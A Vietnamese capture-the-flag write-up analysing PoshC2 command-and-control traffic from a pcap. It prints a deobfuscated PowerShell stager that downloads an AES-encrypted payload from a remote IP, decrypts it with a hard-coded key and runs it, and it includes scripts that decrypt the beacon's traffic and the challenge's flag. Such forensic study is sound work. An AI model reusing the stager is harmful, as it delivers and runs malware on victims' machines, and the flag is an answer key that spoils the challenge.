# interstellar c2-htb-poshc2(beacon-c2 gửi module -yêu cầu thực thi trên máy nạn nhân)

![image.png](interstellar%20c2-htb-poshc2(beacon-c2%20g%E1%BB%ADi%20module%20-y/image.png)

Bài này cho ta 1 file pcap mở lên thì mình thấy nó có gửi 1 tập lệnh powershell qua http khá đáng nghi mình tải về và mở lên thì tronong nó bị obsfucation nên mình có sửa lại 1 chút cho dễ nhìn

```python
$Url = "http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51"
$Ptf = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"

Import-Module BitsTransfer
Start-BitsTransfer -Source $Url -Destination $Ptf

$Fs = New-Object IO.FileStream($Ptf, [System.IO.FileMode]::Open)
$Ms = New-Object System.IO.MemoryStream

$Aes = [System.Security.Cryptography.Aes]::Create()
$Aes.KeySize = 128
$Aes.Key = [byte[]](0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
$Aes.IV  = [byte[]](0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)

$Cs = New-Object System.Security.Cryptography.CryptoStream(
    $Ms,
    $Aes.CreateDecryptor(),
    [System.Security.Cryptography.CryptoStreamMode]::Write
)

$Fs.CopyTo($Cs)
$Decd = $Ms.ToArray()
$Cs.Write($Decd, 0, $Decd.Length)

$Decd | Set-Content -Path "$env:temp\tmp7102591.exe" -Encoding Byte
& "$env:temp\tmp7102591.exe"
```

Đầy là nó tải 1 file về sau đó thì dùng aes giải mã ra  1 file exe giờ việc của chúng ta là vào wireshark tìm file 94974f08-5853-41ab-938a-ae1bd86d8e51 này và tải về sau đó là chúng ta sẽ giải mã nó

![image.png](interstellar%20c2-htb-poshc2(beacon-c2%20g%E1%BB%ADi%20module%20-y/image%201.png)

sau khi decrypt thì mình thu được 1 file thực thi dùng c# nên mình sẽ mở nó bàng dnspy

![image.png](interstellar%20c2-htb-poshc2(beacon-c2%20g%E1%BB%ADi%20module%20-y/image%202.png)

- kiểm tra kill date `2025-01-01`
- thu thập info máy: domain, username, admin hay không, hostname, arch, pid, process name
- dùng **key cứng** `DGCzi...` để mã hóa metadata
- gửi request đầu tiên tới:`/Kettie/Emmie/Anni?Theda=Merrilee?c`
- nhận config từ C2
- regex bóc ra:
    - `RANDOMURI`
    - `URLS`
    - `KILLDATE`
    - `SLEEP`
    - `JITTER`
    - `NEWKEY`
    - `IMGS`
- rồi gọi `ImplantCore(...)`.
=> Đây là hàm **stage-1 config fetch**

### `ImplantCore(...)`

Đây là **hàm quan trọng nhất** sau `primer()`:

- init `UrlGen`, `ImgGen`
- set `Program.pKey = NEWKEY`
- parse sleep/jitter
- vào beacon loop
- GET lệnh từ C2
- decrypt lệnh
- xử lý command:
    - `exit`
    - `loadmodule`
    - `run-dll-background`
    - `run-exe-background`
    - `run-dll`
    - `run-exe`
    - `beacon`
    - còn lại thì gọi `run-exe Core.Program Core {cmd}`
- lấy **16 byte đầu làm IV**
- AES-CBC decrypt phần còn lại
- kết quả sau decrypt lại là **base64 string**
- decode thêm 1 lớp nữa thành plaintext.
=> Đây là chiều **decrypt inbound** từ C2.

### `CreateCam(string key, string IV, bool rij = true)`

Hàm tạo AES object:

- CBC
- zero padding
- block size 128
- key size 256
- nhận key/IV ở dạng base64.
=> Toàn bộ AES của beacon đi qua đây.

### `Compress(byte[] raw)`

GZip nén dữ liệu.

=> Dùng trước khi exfil một số output.

### `Combine(byte[] first, byte[] second)`

Ghép mảng byte.

=> Dùng để tạo `IV || ciphertext`

Hiểu qua vậy thôi đơn giản là chúng ta sẽ biết các get đang bị mã hóa mình sẽ decode các get xem nó đang làm với c2

```python
#!/usr/bin/env python3
import argparse
import base64
import re
import sys
from collections import defaultdict
from pathlib import Path

try:
    from scapy.all import rdpcap, TCP, Raw
except Exception:
    print("[-] Missing scapy. Install: pip install scapy pycryptodome")
    sys.exit(1)

try:
    from Crypto.Cipher import AES
except Exception:
    print("[-] Missing pycryptodome. Install: pip install pycryptodome")
    sys.exit(1)

RANDOM_URI = "dVfhJmc2ciKvPOC"
NEWKEY_B64 = "nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ="

def loose_b64decode(data: bytes):
    s = data.strip().replace(b"\r", b"").replace(b"\n", b"")
    try:
        return base64.b64decode(s, validate=False)
    except Exception:
        return None

def looks_b64_ascii(data: bytes) -> bool:
    s = data.strip()
    return len(s) > 20 and re.fullmatch(br"[A-Za-z0-9+/=\r\n]+", s) is not None

def decrypt_get_body(key_b64: str, body_ascii: bytes) -> bytes:
    key = base64.b64decode(key_b64)
    blob = loose_b64decode(body_ascii)
    if not blob or len(blob) < 16:
        raise ValueError("bad blob")
    iv, ct = blob[:16], blob[16:]
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
    pt = pt.rstrip(b"\x00")
    return base64.b64decode(pt, validate=False)

def build_streams_seq_aware(pcap_path: str):
    pkts = rdpcap(pcap_path)
    segs = defaultdict(list)

    for idx, p in enumerate(pkts):
        if TCP not in p or Raw not in p:
            continue

        ip = p.payload
        if not hasattr(ip, "src") or not hasattr(ip, "dst"):
            continue

        raw = bytes(p[Raw].load)
        if not raw:
            continue

        tcp = p[TCP]
        key = (ip.src, int(tcp.sport), ip.dst, int(tcp.dport))
        segs[key].append((int(tcp.seq), raw, idx))

    streams = {}
    for key, items in segs.items():
        items.sort(key=lambda x: (x[0], x[2]))
        out = bytearray()
        cursor = None
        seen = set()

        for seq, raw, idx in items:
            sig = (seq, len(raw), raw[:32], raw[-32:] if len(raw) > 32 else raw)
            if sig in seen:
                continue
            seen.add(sig)

            if cursor is None:
                out.extend(raw)
                cursor = seq + len(raw)
                continue

            if seq >= cursor:
                gap = seq - cursor
                if gap > 0:
                    out.extend(b"\x00" * gap)
                out.extend(raw)
                cursor = seq + len(raw)
            else:
                overlap = cursor - seq
                if overlap < len(raw):
                    out.extend(raw[overlap:])
                    cursor += len(raw) - overlap

        streams[key] = bytes(out)

    return streams

def parse_http_messages(buf: bytes):
    msgs = []
    i = 0
    n = len(buf)

    while i < n:
        found = []
        for token, typ in [(b"GET ", "request"), (b"POST ", "request"), (b"HTTP/1.", "response")]:
            pos = buf.find(token, i)
            if pos != -1:
                found.append((pos, typ))
        if not found:
            break

        start, typ = min(found, key=lambda x: x[0])
        hdr_end = buf.find(b"\r\n\r\n", start)
        if hdr_end == -1:
            break

        head = buf[start:hdr_end + 4]
        first_line = head.split(b"\r\n", 1)[0].decode("utf-8", "ignore")
        body_start = hdr_end + 4

        m = re.search(br"Content-Length:\s*(\d+)", head, re.I)
        if m:
            clen = int(m.group(1))
            body_end = body_start + clen
            if body_end > n:
                break
            body = buf[body_start:body_end]
            end = body_end
        else:
            if typ == "request":
                body = b""
                end = hdr_end + 4
            else:
                next_resp = buf.find(b"HTTP/1.", body_start)
                if next_resp == -1:
                    body_end = n
                else:
                    body_end = next_resp
                body = buf[body_start:body_end]
                end = body_end

        msgs.append({
            "type": typ,
            "first_line": first_line,
            "body": body,
        })
        i = end

    return msgs

def group_bidirectional(streams):
    conns = {}
    for flow, data in streams.items():
        src, sport, dst, dport = flow
        key = tuple(sorted([(src, sport), (dst, dport)]))
        conns.setdefault(key, {})
        conns[key][flow] = data
    return conns

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("pcap")
    args = ap.parse_args()

    outdir = Path("get_plaintext")
    outdir.mkdir(exist_ok=True)

    streams = build_streams_seq_aware(args.pcap)
    conns = group_bidirectional(streams)

    print(f"[*] Built {len(streams)} directional streams")
    print(f"[*] Grouped into {len(conns)} bidirectional connections")

    count = 0
    lines = []

    for conn_key, sides in conns.items():
        flow_msgs = {}
        for flow, data in sides.items():
            flow_msgs[flow] = parse_http_messages(data)

        flows = list(flow_msgs.keys())

        for req_flow in flows:
            src, sport, dst, dport = req_flow
            rev = (dst, dport, src, sport)

            reqs = [m for m in flow_msgs.get(req_flow, []) if m["type"] == "request"]
            rsps = [m for m in flow_msgs.get(rev, []) if m["type"] == "response"]

            pair_count = min(len(reqs), len(rsps))
            for idx in range(pair_count):
                req = reqs[idx]
                rsp = rsps[idx]

                if not req["first_line"].startswith("GET "):
                    continue
                if RANDOM_URI not in req["first_line"]:
                    continue

                body = rsp["body"]
                if not body:
                    lines.append("=" * 100)
                    lines.append(req["first_line"])
                    lines.append("[SKIP] empty response body")
                    continue

                if not looks_b64_ascii(body):
                    lines.append("=" * 100)
                    lines.append(req["first_line"])
                    lines.append("[SKIP] response body is not base64-looking")
                    lines.append(body[:200].hex())
                    continue

                try:
                    dec = decrypt_get_body(NEWKEY_B64, body)
                except Exception as e:
                    lines.append("=" * 100)
                    lines.append(req["first_line"])
                    lines.append(f"[DECRYPT FAIL] {e}")
                    lines.append(body[:200].decode("utf-8", "ignore"))
                    continue

                count += 1
                try:
                    txt = dec.decode("utf-8", "ignore")
                except Exception:
                    txt = dec.hex()

                Path(outdir / f"get_{count:02d}.txt").write_text(
                    req["first_line"] + "\n\n" + txt,
                    encoding="utf-8",
                    errors="ignore"
                )

                lines.append("=" * 100)
                lines.append(f"[GET {count:02d}] {req['first_line']}")
                lines.append(txt[:5000])

                print(f"[+] decoded GET {count:02d}")

    Path(outdir / "all_gets.txt").write_text("\n".join(lines), encoding="utf-8", errors="ignore")
    print(f"[*] Wrote {outdir / 'all_gets.txt'}")

if __name__ == "__main__":
    main()
```

tiêp giờ mình sẽ đọc các get vì dài nên mình sẽ ko  copy hết vào đây

> 
> 
> 
> # ➜ get_plaintext cat all_gets.txt
> 
> [GET 01] GET /Kikelia/Jacinthe/Adorne/Kariotta/Lonee/Krystalle/4b6ab472-7d73-4a7e-95d0-2f691d8424dc/?dVfhJmc2ciKvPOC HTTP/1.1
> multicmd00031loadmoduleTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAD/RKWIAAAAAAAAAAOAAIgALATAAAMwCAAAIAAAAAAAARukCAAAgAAAAAAMAAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAABAAwAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAPToAgBPAAAAAAADAMQFAAAAAAAAAAAAAAAAAAAAAAAAACADAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAzMoCAAAgAAAAzAIAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAMQFAAAAAAMAAAYAAADOAgAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAACADAAACAAAA1AIAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAo6QIAAAAAAEgAAAACAAUAnOcAAFgBAgABAAAAYQAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABooYAAABioAGzACAI8AAAABAAARAm8cAAAKCisXBm8dAAAKC3IBAABwBygeAAAKKB8AAAoGbyAAAAot4d4KBiwGBm8hAAAK3H4CAAAEbyIAAAoMKzQSAigjAAAKDXINAABwEgMoJAAACigeAAAKKB8AAApyHwAAcBIDKCUAAAooHgAACigfAAAKEgIoJgAACi3D3g4SAv4WBAAAG28hAAAK3CoAARwAAAIABwAjKgAKAAAAAAIAPwBBgAAOAAAAACYCF5ooCwEABioAABswAgBxAAAAAgAAESgIAQAGbxwAAAoKKxcGbx0AAAoLcjUAAHAHKB4AAAooHwAACgZvIAAACi3h3goGLAYGbyEAAArcKAUBAAZvHAAACgorFwZvHQAACgxySwAAcAgoHgAACigfAAAKBm8gAAAKLeHeCgYsBgZvIQAACtwqAAAAARwAAAIACwAj
> 

Từ các GET đã decode, flow của C2 đang làm với máy nạn nhân là:

1. **đẩy module xuống**
2. **đẩy thêm module nữa**
3. **ra lệnh chụp màn hình**

> 
> 
> 
> # [GET 03] GET /Ciel/Constantine/Catlee?Cecile=Karina0938abe7-ec5c-45cc-ab71-31bc1e4fa7e7/?dVfhJmc2ciKvPOC HTTP/1.1
> multicmd00036get-screenshot
> 
> GET /Imogen/Ketti/Kari/Sam/Maurise?Shirlene=Eugenia9c17ef6c-eaea-47a9-880e-e9662edc875d/?dVfhJmc2ciKvPOC HTTP/1.1
> [SKIP] response body is not base64-looking
> 4f4b0a%
> 

Ở đây mọi người sẽ thấy là get ciel/constantine….. là get yêu cầu chụp ảnh nên mình sẽ vafp wireshark tìm gói post của get này để lấy ảnh mình sẽ tải về và lưu là 3.bin

```python
python3 - <<'PY'
from pathlib import Path
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

KEY_B64 = "nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ="

data = Path("3.bin").read_bytes()
blob = data[1500:]
iv = blob[:16]
ct = blob[16:]
ct = ct[:len(ct)//16*16]

key = base64.b64decode(KEY_B64)
pt = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor().update(ct) + Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor().finalize()

Path("4.bin").write_bytes(pt)
print("iv =", iv.hex())
print("head =", pt[:16].hex())
PY
```

sau đó mình sẽ láy madx này deocode post

> ➜  Interstellar C2 file 4.bin                                                                                           4.bin: gzip compressed data, max speed, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 0
➜  Interstellar C2 mv 4.bin 4.gz
> 

> ➜  Interstellar C2 file 4
4: ASCII text, with very long lines (65536), with no line terminators
> 

sau đó mình lên cyberchef decode base64 vì file 4 sau khi đc gunzip toàn là base64

![download.png](interstellar%20c2-htb-poshc2(beacon-c2%20g%E1%BB%ADi%20module%20-y/download.png)

![image.png](interstellar%20c2-htb-poshc2(beacon-c2%20g%E1%BB%ADi%20module%20-y/image%203.png)

HTB{h0w_c4N_y0U_s3e_p05H_c0mM4nd?}
